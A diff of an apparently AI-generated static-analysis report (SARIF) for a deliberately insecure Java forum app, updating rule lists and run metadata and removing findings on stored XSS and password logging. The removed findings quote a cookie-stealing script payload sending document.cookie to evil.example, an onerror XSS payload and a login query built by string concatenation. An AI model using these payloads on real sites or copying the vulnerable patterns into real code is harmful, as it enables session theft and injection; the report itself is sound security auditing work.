@@ -9,13 +9,30 @@
           "informationUri": "https://opentext.com",
           "rules": [
             {
-              "id": "cross-site-scripting/persistent",
+              "id": "privacy-violation",
+              "shortDescription": {
+                "text": "Privacy Violation"
+              },
+              "properties": {
+                "Kingdom": "Security Features"
+              }
+            },
+            {
+              "id": "cross-site-scripting",
               "shortDescription": {
                 "text": "Cross-Site Scripting"
               },
               "properties": {
-                "Kingdom": "Input Validation and Representation",
-                "Subtype": "Persistent"
+                "Kingdom": "Input Validation and Representation"
+              }
+            },
+            {
+              "id": "dockerfile-misconfiguration",
+              "shortDescription": {
+                "text": "Dockerfile Misconfiguration"
+              },
+              "properties": {
+                "Kingdom": "Environment"
               }
             },
             {
@@ -38,22 +55,12 @@
               }
             },
             {
-              "id": "password-management/hardcoded-password",
+              "id": "build-misconfiguration",
               "shortDescription": {
-                "text": "Password Management"
+                "text": "Build Misconfiguration"
               },
               "properties": {
-                "Kingdom": "Security Features",
-                "Subtype": "Hardcoded Password"
-              }
-            },
-            {
-              "id": "html5",
-              "shortDescription": {
-                "text": "HTML5"
-              },
-              "properties": {
-                "Kingdom": "Encapsulation"
+                "Kingdom": "Environment"
               }
             },
             {
@@ -64,195 +71,136 @@
               "properties": {
                 "Kingdom": "Security Features"
               }
-            },
-            {
-              "id": "sql-injection",
-              "shortDescription": {
-                "text": "SQL Injection"
-              },
-              "properties": {
-                "Kingdom": "Input Validation and Representation"
-              }
-            },
-            {
-              "id": "session-management",
-              "shortDescription": {
-                "text": "Session Management"
-              },
-              "properties": {
-                "Kingdom": "Security Features"
-              }
-            },
-            {
-              "id": "cross-site-request-forgery",
-              "shortDescription": {
-                "text": "Cross-Site Request Forgery"
-              },
-              "properties": {
-                "Kingdom": "Encapsulation"
-              }
-            },
-            {
-              "id": "header-manipulation",
-              "shortDescription": {
-                "text": "Header Manipulation"
-              },
-              "properties": {
-                "Kingdom": "Input Validation and Representation"
-              }
             }
           ]
         }
       },
       "invocations": [
         {
-          "startTimeUtc": "2026-06-08T20:47:15.756Z",
-          "endTimeUtc": "2026-06-08T20:56:32.866Z",
+          "startTimeUtc": "2026-07-01T09:40:28.106Z",
+          "endTimeUtc": "2026-07-01T09:46:19.369Z",
           "machine": "RYZEN5800X",
           "executionSuccessful": true,
           "properties": {
             "agent": "FAA (Pi+Sonnet4.6)",
-            "agentVersion": "0.1.0",
+            "agentVersion": "1.0.0",
             "policy": "fortify-aa-default.properties (policy: default)",
             "configuration": {
               "agent": "pi",
-              "analysis.batchsize": "3",
-              "analysis.concurrency": "16",
+              "analysis.effort": "medium",
               "analysis.enabled": "true",
+              "analysis.maxbatchsize": "30",
+              "analysis.maxconcurrency": "16",
+              "analysis.minbatchsize": "3",
               "analysis.model.context": "default",
               "analysis.model.family": "sonnet",
               "analysis.model.version": "latest",
-              "analysis.multiturn": "false",
-              "analysis.strategy": "planned",
-              "effort": "high",
+              "analysis.samples": "1",
+              "files.excludedirs": ".git, .hg, .svn, node_modules, bower_components, vendor, target, build, dist, out, bin, obj, .gradle, .mvn, .idea, .vscode, venv, .venv, __pycache__, .next, .nuxt, coverage, .terraform, .cache",
+              "files.excludeextensions": "png, jpg, jpeg, gif, svg, ico, webp, bmp, tiff, woff, woff2, ttf, eot, otf, mp4, mp3, wav, avi, mov, webm, flac, zip, tar, gz, tgz, bz2, xz, rar, 7z, jar, war, ear, exe, dll, so, dylib, bin, o, a, class, pyc, wasm, node, pdf, doc, docx, xls, xlsx, ppt, pptx, bat, cmd, map, lock, min fpr, sarif",
+              "files.excludegitignored": "true",
+              "files.excludenames": "*.min.js, *.min.css, package-lock.json, yarn.lock, pnpm-lock.yaml, gemfile.lock, poetry.lock, cargo.lock, go.sum, mvnw, gradlew, .git, .hg, .svn",
+              "files.maxbytes": "1000000",
               "maxcost": "50",
+              "pi.provider": "amazon-bedrock",
+              "plan.batchsize": "25",
+              "plan.effort": "medium",
               "plan.enabled": "true",
+              "plan.maxconcurrency": "16",
               "plan.model.context": "default",
               "plan.model.family": "opus",
               "plan.model.version": "latest",
+              "validation.effort": "medium",
               "validation.enabled": "true",
+              "validation.maxbucketsize": "40",
+              "validation.maxconcurrency": "8",
               "validation.model.context": "default",
               "validation.model.family": "opus",
               "validation.model.version": "latest"
             },
-            "tokensInput": 4968,
-            "tokensOutput": 87777,
-            "tokensCacheRead": 915353,
-            "tokensCacheWrite": 156579,
-            "estimatedCostUsd": 3.19429155,
-            "elapsedSeconds": 557
+            "fpr": "D:\\code\\forthosproject\\testprojects\\insecureforum.fpr",
+            "outputFormat": "fod",
+            "tokensInput": 114,
+            "tokensOutput": 79191,
+            "tokensCacheRead": 811588,
+            "tokensCacheWrite": 164702,
+            "estimatedCostUsd": 3.1551573,
+            "elapsedSeconds": 351,
+            "stages": {
+              "plan": {
+                "models": [
+                  "us.anthropic.claude-opus-4-8"
+                ],
+                "tokensInput": 8,
+                "tokensOutput": 549,
+                "tokensCacheRead": 3373,
+                "tokensCacheWrite": 4053,
+                "estimatedCostUsd": 0.12234825,
+                "llmSeconds": 12
+              },
+              "analysis": {
+                "models": [
+                  "us.anthropic.claude-sonnet-4-6"
+                ],
+                "tokensInput": 100,
+                "tokensOutput": 69460,
+                "tokensCacheRead": 769056,
+                "tokensCacheWrite": 133317,
+                "estimatedCostUsd": 1.77285555,
+                "llmSeconds": 1188
+              },
+              "validation": {
+                "models": [
+                  "us.anthropic.claude-opus-4-8"
+                ],
+                "tokensInput": 6,
+                "tokensOutput": 9182,
+                "tokensCacheRead": 39159,
+                "tokensCacheWrite": 27332,
+                "estimatedCostUsd": 1.2599535,
+                "llmSeconds": 144
+              }
+            },
+            "files": {
+              "considered": 23,
+              "inScope": 23,
+              "analyzed": 23
+            },
+            "analyzedFiles": [
+              ".dockerignore",
+              ".github/workflows/codeql-analysis.yml",
+              "Dockerfile",
+              "pom.xml",
+              "src/main/java/com/example/insecureforum/ForumApplication.java",
+              "src/main/java/com/example/insecureforum/database/MessageDAO.java",
+              "src/main/java/com/example/insecureforum/database/MessageDetailDTO.java",
+              "src/main/java/com/example/insecureforum/database/MessageSummaryDTO.java",
+              "src/main/java/com/example/insecureforum/database/UserDAO.java",
+              "src/main/java/com/example/insecureforum/web/AuthenticationController.java",
+              "src/main/java/com/example/insecureforum/web/AuthenticationFilter.java",
+              "src/main/java/com/example/insecureforum/web/HomeController.java",
+              "src/main/java/com/example/insecureforum/web/MessageController.java",
+              "src/main/resources/application.properties",
+              "src/main/resources/db/migration/V1__init.sql",
+              "src/main/resources/static/js/login.js",
+              "src/main/resources/static/js/navbar.js",
+              "src/main/webapp/WEB-INF/tags/pagetemplate.tag",
+              "src/main/webapp/WEB-INF/views/auth/login.jsp",
+              "src/main/webapp/WEB-INF/views/messages/compose.jsp",
+              "src/main/webapp/WEB-INF/views/messages/list.jsp",
+              "src/main/webapp/WEB-INF/views/messages/read.jsp",
+              "test.sh"
+            ]
           }
         }
       ],
       "results": [
         {
-          "ruleId": "cross-site-scripting/persistent",
+          "ruleId": "privacy-violation",
           "level": "error",
           "message": {
-            "text": "At line 17 of <code>read.jsp</code>, the JSP EL expression <code>${msg.subject}</code> is rendered directly inside an <code>&lt;h4&gt;</code> element with no HTML encoding:<pre>&lt;h4&gt;${msg.subject}&lt;/h4&gt;</pre>The <code>subject</code> field originates from the <code>subject</code> HTTP request parameter supplied in the compose form POST (<code>MessageController.composeSubmit</code> → <code>MessageDAO.post()</code>) and is stored verbatim in the database. When retrieved via <code>MessageDAO.read()</code> and placed into the Spring MVC model, it is rendered here without any output escaping.\n\nJSP EL expressions (<code>${...}</code>) do <strong>not</strong> perform automatic HTML encoding. Only <code>&lt;c:out value=\"${msg.subject}\"/&gt;</code> or <code>${fn:escapeXml(msg.subject)}</code> would encode HTML metacharacters. Because neither is used, any HTML or JavaScript injected into the subject field at post time is reproduced verbatim in every reader's browser, constituting stored (persistent) Cross-Site Scripting.\n\n<strong>Attack scenario:</strong> An authenticated user posts a message with the subject <code>&lt;script&gt;document.location='https://evil.example/steal?c='+document.cookie&lt;/script&gt;</code>. Every user who views the message has their session cookie exfiltrated.<h3>Affected Code</h3><code>src/main/webapp/WEB-INF/views/messages/read.jsp</code><pre>12&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/a&gt;\n13&nbsp;|&nbsp;&lt;/div&gt;\n14&nbsp;|&nbsp;&lt;div class=\"column is-9\"&gt;\n15&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"box content\"&gt;\n16&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;article class=\"readheader\"&gt;\n17&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;h4&gt;${msg.subject}&lt;/h4&gt;\n18&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"media\"&gt;\n19&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"media-content\"&gt;\n20&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"content\"&gt;\n21&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;by ${msg.author} on ${msg.timestamp}\n22&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/div&gt;</pre><h3>Remediation</h3>Replace the bare EL expression with the JSTL output tag that HTML-encodes by default:<pre>&lt;h4&gt;&lt;c:out value=\"${msg.subject}\"/&gt;&lt;/h4&gt;</pre>Alternatively use the JSTL EL function:<pre>&lt;h4&gt;${fn:escapeXml(msg.subject)}&lt;/h4&gt;</pre>Both approaches encode <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, <code>\"</code>, and <code>'</code> before writing to the HTML stream, neutralising any injected markup. Apply the same fix consistently to every other unescaped EL expression in this file (<code>msg.author</code>, <code>msg.body</code>).",
-            "markdown": "At line 17 of `read.jsp`, the JSP EL expression `${msg.subject}` is rendered directly inside an `<h4>` element with no HTML encoding:\n\n```jsp\n<h4>${msg.subject}</h4>\n```\n\nThe `subject` field originates from the `subject` HTTP request parameter supplied in the compose form POST (`MessageController.composeSubmit` → `MessageDAO.post()`) and is stored verbatim in the database. When retrieved via `MessageDAO.read()` and placed into the Spring MVC model, it is rendered here without any output escaping.\n\nJSP EL expressions (`${...}`) do **not** perform automatic HTML encoding. Only `<c:out value=\"${msg.subject}\"/>` or `${fn:escapeXml(msg.subject)}` would encode HTML metacharacters. Because neither is used, any HTML or JavaScript injected into the subject field at post time is reproduced verbatim in every reader's browser, constituting stored (persistent) Cross-Site Scripting.\n\n**Attack scenario:** An authenticated user posts a message with the subject `<script>document.location='https://evil.example/steal?c='+document.cookie</script>`. Every user who views the message has their session cookie exfiltrated."
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "src/main/webapp/WEB-INF/views/messages/read.jsp"
-                },
-                "region": {
-                  "startLine": 17,
-                  "snippet": {
-                    "text": "                    </a>\n                </div>\n                <div class=\"column is-9\">\n                    <div class=\"box content\">\n                        <article class=\"readheader\">\n                            <h4>${msg.subject}</h4>\n                            <div class=\"media\">\n                                <div class=\"media-content\">\n                                    <div class=\"content\">\n                                        by ${msg.author} on ${msg.timestamp}\n                                    </div>"
-                  }
-                }
-              }
-            }
-          ],
-          "fingerprints": {
-            "fortify/instance-id": "6B34CFED4635C63891FA5A9A1B3A7EB8"
-          },
-          "properties": {
-            "impact": 4.5,
-            "likelihood": 4.5,
-            "snippetStartLine": 12,
-            "summary": "Stored XSS: unescaped EL expression ${msg.subject} renders attacker-controlled message subject directly into HTML",
-            "remediationSummary": "Replace ${msg.subject} with &lt;c:out value=\"${msg.subject}\"/&gt; or ${fn:escapeXml(msg.subject)} to HTML-encode the value before rendering.",
-            "remediation": "Replace the bare EL expression with the JSTL output tag that HTML-encodes by default:\n\n```jsp\n<h4><c:out value=\"${msg.subject}\"/></h4>\n```\n\nAlternatively use the JSTL EL function:\n\n```jsp\n<h4>${fn:escapeXml(msg.subject)}</h4>\n```\n\nBoth approaches encode `<`, `>`, `&`, `\"`, and `'` before writing to the HTML stream, neutralising any injected markup. Apply the same fix consistently to every other unescaped EL expression in this file (`msg.author`, `msg.body`)."
-          }
-        },
-        {
-          "ruleId": "cross-site-scripting/persistent",
-          "level": "error",
-          "message": {
-            "text": "At line 22 of <code>read.jsp</code>, the JSP EL expression <code>${msg.author}</code> is rendered inside a <code>&lt;div class=\"content\"&gt;</code> element with no HTML encoding:<pre>by ${msg.author} on ${msg.timestamp}</pre>The <code>author</code> field is populated from the HTTP cookie <code>user</code> (read in <code>MessageController.composeSubmit</code> via <code>@CookieValue(value = \"user\", defaultValue = \"anonymous\") String user</code>) and written directly to the database via <code>MessageDAO.post()</code>. The <code>user</code> cookie is set to whatever username the user successfully authenticated with, but the authentication cookie is set without <code>HttpOnly</code> or <code>Secure</code> flags, and crucially the cookie <strong>value itself</strong> is user-supplied input (the <code>username</code> parameter from the login form → <code>AuthenticationController.loginSubmit</code> → <code>setCookie</code>).\n\nAn attacker who registers a username containing HTML/JavaScript (e.g., <code>&lt;img src=x onerror=alert(1)&gt;</code>) will have that string stored as the <code>author</code> of every post they submit and will be executed in every reader's browser, constituting stored (persistent) Cross-Site Scripting.\n\nJSP EL <code>${...}</code> provides no automatic HTML escaping.<h3>Affected Code</h3><code>src/main/webapp/WEB-INF/views/messages/read.jsp</code><pre>17&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;h4&gt;${msg.subject}&lt;/h4&gt;\n18&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"media\"&gt;\n19&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"media-content\"&gt;\n20&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"content\"&gt;\n21&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;by ${msg.author} on ${msg.timestamp}\n22&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/div&gt;\n23&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/div&gt;\n24&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/div&gt;\n25&nbsp;|&nbsp;&lt;/article&gt;\n26&nbsp;|&nbsp;&lt;article&gt;\n27&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"media\"&gt;</pre><h3>Remediation</h3>Replace the bare EL expression with JSTL output encoding:<pre>by &lt;c:out value=\"${msg.author}\"/&gt; on &lt;c:out value=\"${msg.timestamp}\"/&gt;</pre>This HTML-encodes the author name before it is written into the HTML stream. Additionally, consider validating/sanitising usernames during registration to disallow HTML-significant characters.",
-            "markdown": "At line 22 of `read.jsp`, the JSP EL expression `${msg.author}` is rendered inside a `<div class=\"content\">` element with no HTML encoding:\n\n```jsp\nby ${msg.author} on ${msg.timestamp}\n```\n\nThe `author` field is populated from the HTTP cookie `user` (read in `MessageController.composeSubmit` via `@CookieValue(value = \"user\", defaultValue = \"anonymous\") String user`) and written directly to the database via `MessageDAO.post()`. The `user` cookie is set to whatever username the user successfully authenticated with, but the authentication cookie is set without `HttpOnly` or `Secure` flags, and crucially the cookie **value itself** is user-supplied input (the `username` parameter from the login form → `AuthenticationController.loginSubmit` → `setCookie`).\n\nAn attacker who registers a username containing HTML/JavaScript (e.g., `<img src=x onerror=alert(1)>`) will have that string stored as the `author` of every post they submit and will be executed in every reader's browser, constituting stored (persistent) Cross-Site Scripting.\n\nJSP EL `${...}` provides no automatic HTML escaping."
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "src/main/webapp/WEB-INF/views/messages/read.jsp"
-                },
-                "region": {
-                  "startLine": 22,
-                  "snippet": {
-                    "text": "                            <h4>${msg.subject}</h4>\n                            <div class=\"media\">\n                                <div class=\"media-content\">\n                                    <div class=\"content\">\n                                        by ${msg.author} on ${msg.timestamp}\n                                    </div>\n                                </div>\n                            </div>\n                        </article>\n                        <article>\n                            <div class=\"media\">"
-                  }
-                }
-              }
-            }
-          ],
-          "fingerprints": {
-            "fortify/instance-id": "2ADCF643AC69A2A1DC72A3A0454F66A6"
-          },
-          "properties": {
-            "impact": 4.5,
-            "likelihood": 4,
-            "snippetStartLine": 17,
-            "summary": "Stored XSS: unescaped EL expression ${msg.author} renders attacker-controlled cookie-derived author name directly into HTML",
-            "remediationSummary": "Replace ${msg.author} with &lt;c:out value=\"${msg.author}\"/&gt; or ${fn:escapeXml(msg.author)} to prevent stored XSS via the author cookie value.",
-            "remediation": "Replace the bare EL expression with JSTL output encoding:\n\n```jsp\nby <c:out value=\"${msg.author}\"/> on <c:out value=\"${msg.timestamp}\"/>\n```\n\nThis HTML-encodes the author name before it is written into the HTML stream. Additionally, consider validating/sanitising usernames during registration to disallow HTML-significant characters."
-          }
-        },
-        {
-          "ruleId": "cross-site-scripting/persistent",
-          "level": "error",
-          "message": {
-            "text": "At line 32 of <code>read.jsp</code>, the JSP EL expression <code>${msg.body}</code> is rendered inside a <code>&lt;div class=\"content\"&gt;</code> element with no HTML encoding:<pre>&lt;div class=\"content\"&gt;\n&nbsp;&nbsp;&nbsp;&nbsp;${msg.body}\n&lt;/div&gt;</pre>The <code>body</code> field originates from the <code>body</code> HTTP request parameter (<code>&lt;textarea name=\"body\"&gt;</code>) in the compose form, stored verbatim in the database by <code>MessageDAO.post()</code> and retrieved by <code>MessageDAO.read()</code>. There is no server-side sanitisation at any point in the data flow.\n\nBecause the message body is the largest free-form text area available to an attacker, this is the highest-value XSS sink in the application: an attacker can craft complex payloads, including multi-stage exfiltration scripts, keyloggers, or BeEF hook injections. JSP EL <code>${...}</code> provides no automatic HTML escaping.<h3>Affected Code</h3><code>src/main/webapp/WEB-INF/views/messages/read.jsp</code><pre>27&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"media\"&gt;\n28&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"media-content\"&gt;\n29&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"content\"&gt;\n30&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;${msg.body}\n31&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/div&gt;\n32&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/div&gt;\n33&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/div&gt;\n34&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/article&gt;\n35&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/div&gt;\n36&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/div&gt;\n37&nbsp;|&nbsp;&lt;/div&gt;</pre><h3>Remediation</h3>If the body is intended as plain text, replace the EL expression with a JSTL output tag:<pre>&lt;div class=\"content\"&gt;\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;c:out value=\"${msg.body}\"/&gt;\n&lt;/div&gt;</pre>If formatted (rich-text) content must be supported, use a well-maintained HTML sanitisation library (e.g., OWASP Java HTML Sanitizer) to strip unsafe tags and attributes <strong>before</strong> storing the content in the database, and additionally encode at render time.\n\nUnder no circumstances should raw, un-sanitised, un-encoded HTML from user input be passed to the browser.",
-            "markdown": "At line 32 of `read.jsp`, the JSP EL expression `${msg.body}` is rendered inside a `<div class=\"content\">` element with no HTML encoding:\n\n```jsp\n<div class=\"content\">\n    ${msg.body}\n</div>\n```\n\nThe `body` field originates from the `body` HTTP request parameter (`<textarea name=\"body\">`) in the compose form, stored verbatim in the database by `MessageDAO.post()` and retrieved by `MessageDAO.read()`. There is no server-side sanitisation at any point in the data flow.\n\nBecause the message body is the largest free-form text area available to an attacker, this is the highest-value XSS sink in the application: an attacker can craft complex payloads, including multi-stage exfiltration scripts, keyloggers, or BeEF hook injections. JSP EL `${...}` provides no automatic HTML escaping."
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "src/main/webapp/WEB-INF/views/messages/read.jsp"
-                },
-                "region": {
-                  "startLine": 32,
-                  "snippet": {
-                    "text": "                            <div class=\"media\">\n                                <div class=\"media-content\">\n                                    <div class=\"content\">\n                                        ${msg.body}\n                                    </div>\n                                </div>\n                            </div>\n                        </article>\n                    </div>\n                </div>\n            </div>"
-                  }
-                }
-              }
-            }
-          ],
-          "fingerprints": {
-            "fortify/instance-id": "0C2F95272EC851609AD445BACD92E7A6"
-          },
-          "properties": {
-            "impact": 4.8,
-            "likelihood": 4.8,
-            "snippetStartLine": 27,
-            "summary": "Stored XSS: unescaped EL expression ${msg.body} renders attacker-controlled message body directly into HTML, enabling arbitrary script execution",
-            "remediationSummary": "Replace ${msg.body} with &lt;c:out value=\"${msg.body}\"/&gt; to HTML-encode user-supplied message body content before rendering, preventing stored XSS.",
-            "remediation": "If the body is intended as plain text, replace the EL expression with a JSTL output tag:\n\n```jsp\n<div class=\"content\">\n    <c:out value=\"${msg.body}\"/>\n</div>\n```\n\nIf formatted (rich-text) content must be supported, use a well-maintained HTML sanitisation library (e.g., OWASP Java HTML Sanitizer) to strip unsafe tags and attributes **before** storing the content in the database, and additionally encode at render time.\n\nUnder no circumstances should raw, un-sanitised, un-encoded HTML from user input be passed to the browser."
-          }
-        },
-        {
-          "ruleId": "password-management",
-          "level": "error",
-          "message": {
-            "text": "The <code>ForumApplication</code> bean wraps every <code>DataSource</code> in a <code>ProxyDataSourceBuilder</code> that logs every SQL statement at <code>DEBUG</code> level under the logger <code>com.example.insecureforum.jdbc</code> (line 23):<pre>DataSource loggingDataSource = ProxyDataSourceBuilder\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.create(dataSource)\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.logQueryBySlf4j(SLF4JLogLevel.DEBUG, \"com.example.insecureforum.jdbc\").build();</pre><code>application.properties</code> enables DEBUG for the whole <code>com.example.insecureforum</code> package (<code>logging.level.com.example.insecureforum=DEBUG</code>), which covers this sub-logger. Therefore every query that passes through the <code>JdbcTemplate</code> is logged.\n\n<code>UserDAO.authenticate()</code> builds its query by raw string concatenation:<pre>\"SELECT 1 FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\"</pre>When a user attempts to log in, the full SQL string — including their plaintext password — is intercepted by the proxy and written to the log. An attacker who can read log files (e.g., via a log aggregator, a file-read vulnerability, misconfigured log storage, or access to the server) gains all user passwords. Even if DEBUG is disabled in production, the plaintext password still traverses the proxy and would be logged the moment DEBUG is re-enabled for troubleshooting.<h3>Affected Code</h3><code>src/main/java/com/example/insecureforum/ForumApplication.java</code><pre>19&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@Bean\n20&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public JdbcTemplate jdbcTemplate(DataSource dataSource) {\n21&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DataSource loggingDataSource = ProxyDataSourceBuilder\n22&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.create(dataSource)\n23&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.logQueryBySlf4j(SLF4JLogLevel.DEBUG, \"com.example.insecureforum.jdbc\").build();\n24&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return new JdbcTemplate(loggingDataSource);\n25&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\n26&nbsp;|&nbsp;\n27&nbsp;|&nbsp;}</pre><h3>Remediation</h3>1. <strong>Stop embedding credentials in SQL strings.</strong> Migrate <code>UserDAO.authenticate()</code> to use parameterized queries (prepared statements via <code>JdbcTemplate.query(sql, args, rowMapper)</code> or named parameters). This ensures the password is never part of the loggable SQL text.\n\n2. <strong>Remove the query-logging proxy, or restrict its scope.</strong> The <code>ProxyDataSourceBuilder</code> with <code>logQueryBySlf4j</code> logs the full SQL text verbatim. If query-level tracing is needed for debugging, log only non-sensitive queries, or mask bind parameters. Many JDBC proxy libraries support parameter masking.\n\n3. <strong>Reduce the default log level.</strong> Do not ship <code>logging.level.com.example.insecureforum=DEBUG</code> in production configuration. Move it to a development-only profile (<code>application-dev.properties</code>).\n\n4. <strong>Hash passwords at rest.</strong> Even after fixing the SQL injection and logging issues, passwords in the <code>users</code> table should be stored as a strong one-way hash (e.g., bcrypt), so a compromised log or database does not expose cleartext secrets.",
-            "markdown": "The `ForumApplication` bean wraps every `DataSource` in a `ProxyDataSourceBuilder` that logs every SQL statement at `DEBUG` level under the logger `com.example.insecureforum.jdbc` (line 23):\n\n```java\nDataSource loggingDataSource = ProxyDataSourceBuilder\n        .create(dataSource)\n        .logQueryBySlf4j(SLF4JLogLevel.DEBUG, \"com.example.insecureforum.jdbc\").build();\n```\n\n`application.properties` enables DEBUG for the whole `com.example.insecureforum` package (`logging.level.com.example.insecureforum=DEBUG`), which covers this sub-logger. Therefore every query that passes through the `JdbcTemplate` is logged.\n\n`UserDAO.authenticate()` builds its query by raw string concatenation:\n```java\n\"SELECT 1 FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\"\n```\n\nWhen a user attempts to log in, the full SQL string — including their plaintext password — is intercepted by the proxy and written to the log. An attacker who can read log files (e.g., via a log aggregator, a file-read vulnerability, misconfigured log storage, or access to the server) gains all user passwords. Even if DEBUG is disabled in production, the plaintext password still traverses the proxy and would be logged the moment DEBUG is re-enabled for troubleshooting."
